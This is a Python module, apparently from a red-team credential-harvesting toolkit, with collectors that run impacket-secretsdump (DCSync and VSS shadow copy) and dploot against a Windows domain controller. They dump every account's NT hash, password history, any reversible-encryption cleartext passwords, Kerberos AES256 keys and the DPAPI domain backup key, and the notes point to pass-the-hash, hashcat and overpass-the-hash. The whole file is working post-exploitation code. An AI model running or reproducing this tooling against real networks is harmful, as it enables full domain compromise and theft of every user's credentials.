"""DC-only loot (needs DCSync/DA rights, fails gracefully otherwise):
  - NTDS.dit domain hashes      (impacket-secretsdump -just-dc -history)
  - NTDS via VSS shadow copy    (impacket-secretsdump -use-vss -history)
  - DPAPI domain backup key     (dploot backupkey) -> decrypts every user's DPAPI
All only run against a DC (needs_ldap) and skip unless a cred is admin on it.

We use -just-dc (NOT -just-dc-ntlm) so secretsdump also emits CLEARTEXT passwords
(accounts with reversible encryption) and Kerberos keys; -history additionally
dumps password-history entries (old passwords, often reused or weaker). Each of
those is parsed into its own Secret so nothing with a plaintext or a reusable key
is silently dropped just because the NT hash would not crack.
"""
from __future__ import annotations

import re
from typing import List

from core.credential import Credential
from core.secret import Secret, Status
from core.tools import find_tool, run, strip_ansi
from .base import BaseCollector

# user:rid:lm:nt:::            (username may be DOMAIN\user, no colon in it)
NTDS_RE = re.compile(r"^([^:]+):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::")
# DOMAIN\user:CLEARTEXT:the plaintext password   (reversible encryption)
CLEARTEXT_RE = re.compile(r"^(.+?):CLEARTEXT:(.+)$")
# DOMAIN\user:aes256-cts-hmac-sha1-96:<64 hex>   (reusable for overpass/PtK)
AES256_RE = re.compile(r"^(.+?):aes256-cts-hmac-sha1-96:([0-9a-fA-F]{64})$")


def _parse_dc(output: str, host: str, source: str) -> List[Secret]:
    found: List[Secret] = []
    for line in strip_ansi(output).splitlines():
        line = line.strip()

        m = NTDS_RE.match(line)
        if m:
            user, _rid, _lm, nt = m.groups()
            found.append(Secret(host, source, user, nt, Status.HASH,
                                secret_type="nthash",
                                notes="domain hash; PtH or hashcat -m 1000"))
            continue

        m = CLEARTEXT_RE.match(line)
        if m:
            user, pw = m.groups()
            found.append(Secret(host, source, user, pw, Status.CLEARTEXT,
                                secret_type="password",
                                notes="reversible-encryption cleartext; use directly"))
            continue

        m = AES256_RE.match(line)
        if m:
            user, key = m.groups()
            found.append(Secret(host, source, user, key, Status.HASH,
                                secret_type="aes256-key",
                                notes="Kerberos AES256 key; overpass-the-hash when NT won't crack"))
            continue
    return found


class NtdsCollector(BaseCollector):
    name = "NTDS"
    description = "Full NTDS.dit domain secrets: hashes + cleartext + kerb keys (needs DCSync/DA)"
    per_credential = False
    needs_ldap = True
    needs_admin_dc = True
    requires = ("secretsdump",)

    def collect_once(self, cred: Credential) -> List[Secret]:
        bin_ = find_tool("secretsdump")
        if not bin_:
            return []
        cmd = ([bin_, cred.secretsdump_target(self.host), "-just-dc", "-history"]
               + cred.impacket_extra_args())
        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                  raw_name=self._raw_name(cred))
        return _parse_dc(res.output, self.host, "NTDS")


class VssCollector(BaseCollector):
    name = "VSS"
    description = "NTDS via VSS shadow copy (alt to DRSUAPI; needs admin on DC)"
    per_credential = False
    needs_ldap = True
    needs_admin_dc = True
    requires = ("secretsdump",)

    def collect_once(self, cred: Credential) -> List[Secret]:
        bin_ = find_tool("secretsdump")
        if not bin_:
            return []
        cmd = ([bin_, cred.secretsdump_target(self.host), "-just-dc", "-history", "-use-vss"]
               + cred.impacket_extra_args())
        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                  raw_name=self._raw_name(cred))
        return _parse_dc(res.output, self.host, "VSS-NTDS")


class BackupkeyCollector(BaseCollector):
    name = "BackupKey"
    description = "DPAPI domain backup key (needs DA) - decrypts all user DPAPI"
    per_credential = True
    needs_ldap = True
    needs_admin_dc = True
    requires = ("dploot",)

    def collect_with_cred(self, cred: Credential) -> List[Secret]:
        bin_ = find_tool("dploot")
        if not bin_:
            return []
        out_pvk = f"{self.raw_dir}/backupkey.pvk"
        cmd = ([bin_, "backupkey", "-t", self.host, "--outputfile", out_pvk]
               + cred.dploot_auth_args())
        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                  raw_name=self._raw_name(cred))
        low = strip_ansi(res.output).lower()
        if "written" in low or "saved" in low or ".pvk" in low:
            return [Secret(self.host, "BackupKey", "", out_pvk, Status.CLEARTEXT,
                           secret_type="pvk",
                           notes="use with dploot --pvk to decrypt ALL users' DPAPI")]
        return []
